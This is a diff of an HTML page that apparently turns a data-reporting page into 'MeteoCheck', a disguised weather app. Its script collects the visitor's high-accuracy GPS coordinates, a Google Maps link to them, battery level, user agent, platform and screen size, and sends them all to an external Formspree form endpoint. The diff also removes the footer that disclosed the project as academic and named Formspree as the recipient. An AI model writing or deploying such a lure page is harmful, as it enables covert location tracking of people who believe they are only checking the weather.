@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ClimaLocal — Reporte Rápido</title>
+    <title>MeteoCheck — Clima y Estado Local</title>
     <style>
         * { box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #141e30, #243b55);
-            color: #f5f7fa;
+            background: radial-gradient(circle at top, #1e293b, #0f172a);
+            color: #f8fafc;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,161 +18,216 @@
             padding: 16px;
         }
         .card {
-            background: rgba(25, 35, 52, 0.92);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 28px 24px;
-            border-radius: 16px;
-            text-align: center;
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid rgba(148, 163, 184, 0.2);
+            padding: 26px 22px;
+            border-radius: 18px;
             width: 100%;
-            max-width: 360px;
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
+            max-width: 390px;
+            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.45);
         }
-        .badge {
-            display: inline-block;
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .tag {
             background: rgba(56, 189, 248, 0.15);
             color: #7dd3fc;
             font-size: 12px;
             font-weight: 600;
             padding: 4px 10px;
             border-radius: 999px;
-            margin-bottom: 12px;
+        }
+        .live-dot {
+            font-size: 12px;
+            color: #4ade80;
         }
         h1 {
-            margin: 0 0 8px;
-            font-size: 21px;
+            margin: 0 0 6px;
+            font-size: 22px;
         }
-        p {
+        .sub {
+            margin: 0 0 20px;
             font-size: 14px;
-            color: #cbd5e1;
-            line-height: 1.5;
-            margin: 0 0 22px;
+            color: #94a3b8;
+            line-height: 1.45;
         }
         .btn {
-            background: #0ea5e9;
-            color: #fff;
+            width: 100%;
+            padding: 12px 16px;
             border: none;
-            padding: 12px 18px;
-            border-radius: 10px;
-            cursor: pointer;
+            border-radius: 11px;
+            background: #0284c7;
+            color: #fff;
             font-size: 15px;
             font-weight: 600;
-            width: 100%;
-            transition: background 0.2s ease, transform 0.1s ease;
+            cursor: pointer;
+            transition: background 0.2s ease;
         }
-        .btn:hover { background: #0284c7; }
-        .btn:active { transform: scale(0.99); }
-        .loader {
-            border: 3px solid rgba(255, 255, 255, 0.15);
-            border-top: 3px solid #38bdf8;
-            border-radius: 50%;
-            width: 28px;
-            height: 28px;
-            animation: spin 0.9s linear infinite;
-            margin: 18px auto 10px;
+        .btn:hover { background: #0369a1; }
+        .progress-box {
             display: none;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            margin-top: 14px;
-            font-size: 13px;
-            line-height: 1.45;
-            padding: 12px;
-            border-radius: 10px;
-            display: none;
-        }
-        .status.ok {
-            display: block;
-            background: rgba(34, 197, 94, 0.15);
-            border: 1px solid rgba(34, 197, 94, 0.35);
-            color: #86efac;
-        }
-        .status.err {
-            display: block;
-            background: rgba(239, 68, 68, 0.15);
-            border: 1px solid rgba(239, 68, 68, 0.35);
-            color: #fca5a5;
-        }
-        .meta {
             margin-top: 16px;
+            padding: 14px;
+            border-radius: 12px;
+            background: rgba(30, 41, 59, 0.75);
+            border: 1px solid rgba(148, 163, 184, 0.15);
+        }
+        .step {
+            font-size: 13px;
+            color: #cbd5e1;
+            margin: 6px 0;
+        }
+        .result-box {
+            display: none;
+            margin-top: 16px;
+            padding: 16px;
+            border-radius: 12px;
+            background: rgba(20, 83, 45, 0.25);
+            border: 1px solid rgba(74, 222, 128, 0.35);
+        }
+        .metrics {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 12px;
+        }
+        .metric {
+            background: rgba(15, 23, 42, 0.65);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .metric span {
+            display: block;
             font-size: 11px;
             color: #94a3b8;
+        }
+        .metric strong {
+            font-size: 15px;
+            color: #f8fafc;
+        }
+        .map-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #7dd3fc;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .map-link:hover { text-decoration: underline; }
+        .err-box {
+            display: none;
+            margin-top: 14px;
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(127, 29, 29, 0.35);
+            border: 1px solid rgba(248, 113, 113, 0.4);
+            color: #fca5a5;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <span class="badge">🌤️ Servicio Local</span>
-    <h1>Reporte de Zona y Equipo</h1>
-    <p>Activa la consulta para preparar el reporte de tu ubicación actual y el estado básico de tu sesión.</p>
+    <div class="header">
+        <span class="tag">🌦️ MeteoCheck</span>
+        <span class="live-dot">● En línea</span>
+    </div>
+    <h1>Clima de tu zona</h1>
+    <p class="sub">Consulta la temperatura actual según tu ubicación y genera el reporte del equipo.</p>
 
-    <button class="btn" id="btnAction" onclick="generarReporte()">Generar reporte ahora</button>
-    <div class="loader" id="spinner"></div>
-    <div class="status" id="statusBox"></div>
+    <button class="btn" id="btnStart" onclick="iniciar()">Consultar clima y reporte</button>
 
-    <div class="meta">Proyecto académico • Envío vía Formspree</div>
+    <div class="progress-box" id="progressBox">
+        <div class="step" id="s1">⏳ Obteniendo ubicación...</div>
+        <div class="step" id="s2">⏳ Consultando clima local...</div>
+        <div class="step" id="s3">⏳ Enviando reporte...</div>
+    </div>
+
+    <div class="result-box" id="resultBox"></div>
+    <div class="err-box" id="errBox"></div>
 </div>
 
 <script>
     const API_URL = "https://formspree.io/f/xgakrnjg";
 
-    async function obtenerUbicacion() {
+    function obtenerUbicacion() {
         if (!("geolocation" in navigator)) {
-            return { disponible: false, motivo: "No soportado" };
+            return Promise.resolve({ disponible: false, motivo: "No soportado" });
         }
-
         return new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        disponible: true,
-                        latitud: pos.coords.latitude,
-                        longitud: pos.coords.longitude,
-                        precisionMetros: Math.round(pos.coords.accuracy)
-                    });
-                },
-                (err) => {
-                    resolve({
-                        disponible: false,
-                        motivo: err.message || "Permiso denegado o no disponible"
-                    });
-                },
+                (pos) => resolve({
+                    disponible: true,
+                    latitud: pos.coords.latitude,
+                    longitud: pos.coords.longitude,
+                    precisionMetros: Math.round(pos.coords.accuracy)
+                }),
+                (err) => resolve({
+                    disponible: false,
+                    motivo: err.message || "Permiso denegado"
+                }),
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         });
     }
 
-    async function obtenerBateria() {
-        if (!("getBattery" in navigator)) {
-            return "No disponible";
+    async function obtenerClima(lat, lon) {
+        try {
+            const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`;
+            const res = await fetch(url);
+            if (!res.ok) return null;
+            const data = await res.json();
+            return data.current_weather || null;
+        } catch (e) {
+            return null;
         }
+    }
+
+    async function obtenerBateria() {
+        if (!("getBattery" in navigator)) return "No disponible";
         try {
             const b = await navigator.getBattery();
-            return `${Math.round(b.level * 100)}%${b.charging ? " (cargando)" : ""}`;
+            return `${Math.round(b.level * 100)}%${b.charging ? " ⚡" : ""}`;
         } catch (e) {
             return "No disponible";
         }
     }
 
-    async function generarReporte() {
-        const btn = document.getElementById("btnAction");
-        const spinner = document.getElementById("spinner");
-        const statusBox = document.getElementById("statusBox");
+    async function iniciar() {
+        const btn = document.getElementById("btnStart");
+        const progressBox = document.getElementById("progressBox");
+        const resultBox = document.getElementById("resultBox");
+        const errBox = document.getElementById("errBox");
+        const s1 = document.getElementById("s1");
+        const s2 = document.getElementById("s2");
+        const s3 = document.getElementById("s3");
 
         btn.style.display = "none";
-        statusBox.className = "status";
-        statusBox.style.display = "none";
-        spinner.style.display = "block";
+        errBox.style.display = "none";
+        resultBox.style.display = "none";
+        progressBox.style.display = "block";
 
+        s1.textContent = "⏳ Obteniendo ubicación...";
         const ubicacion = await obtenerUbicacion();
+        s1.textContent = ubicacion.disponible ? "✅ Ubicación detectada" : "⚠️ Ubicación no compartida";
+
+        s2.textContent = "⏳ Consultando clima local...";
+        const clima = ubicacion.disponible ? await obtenerClima(ubicacion.latitud, ubicacion.longitud) : null;
+        s2.textContent = clima ? `✅ Clima: ${clima.temperature}°C` : "ℹ️ Sin datos de clima";
+
         const bateria = await obtenerBateria();
+        const enlaceMapa = ubicacion.disponible
+            ? `https://www.google.com/maps?q=${ubicacion.latitud},${ubicacion.longitud}`
+            : "Ubicación no disponible";
 
         const payload = {
             fechaHora: new Date().toISOString(),
+            enlaceMapa,
             ubicacion,
+            climaActual: clima ? `${clima.temperature}°C, viento ${clima.windspeed} km/h` : "No disponible",
             dispositivo: {
                 userAgent: navigator.userAgent,
                 plataforma: navigator.platform,
@@ -182,6 +237,7 @@
             }
         };
 
+        s3.textContent = "⏳ Enviando reporte...";
         try {
             const resp = await fetch(API_URL, {
                 method: "POST",
@@ -192,21 +248,39 @@
                 body: JSON.stringify(payload)
             });
 
-            spinner.style.display = "none";
+            if (!resp.ok) throw new Error("Error al enviar");
 
-            if (!resp.ok) {
-                throw new Error("Respuesta no válida de Formspree");
-            }
-
-            statusBox.className = "status ok";
-            statusBox.innerHTML = ubicacion.disponible
-                ? `✅ Reporte enviado correctamente.<br><small>Coordenadas: ${ubicacion.latitud.toFixed(4)}, ${ubicacion.longitud.toFixed(4)}</small>`
-                : `✅ Reporte de equipo enviado.<br><small>Ubicación no compartida (${ubicacion.motivo}).</small>`;
-        } catch (error) {
-            spinner.style.display = "none";
+            s3.textContent = "✅ Reporte enviado";
+            resultBox.style.display = "block";
+            resultBox.innerHTML = `
+                <strong>Reporte completado</strong>
+                <div class="metrics">
+                    <div class="metric">
+                        <span>Temperatura</span>
+                        <strong>${clima ? `${clima.temperature}°C` : "N/D"}</strong>
+                    </div>
+                    <div class="metric">
+                        <span>Batería</span>
+                        <strong>${bateria}</strong>
+                    </div>
+                    <div class="metric">
+                        <span>Precisión</span>
+                        <strong>${ubicacion.disponible ? `±${ubicacion.precisionMetros} m` : "Sin GPS"}</strong>
+                    </div>
+                    <div class="metric">
+                        <span>Pantalla</span>
+                        <strong>${window.screen.width}×${window.screen.height}</strong>
+                    </div>
+                </div>
+                ${ubicacion.disponible
+                    ? `<a class="map-link" href="${enlaceMapa}" target="_blank" rel="noopener">Abrir ubicación en Google Maps ↗</a>`
+                    : ""}
+            `;
+        } catch (err) {
+            progressBox.style.display = "none";
             btn.style.display = "block";
-            statusBox.className = "status err";
-            statusBox.textContent = "❌ No se pudo enviar el reporte. Revisa tu conexión o el endpoint de Formspree.";
+            errBox.style.display = "block";
+            errBox.textContent = "No se pudo completar el envío. Intenta de nuevo.";
         }
     }
 </script>
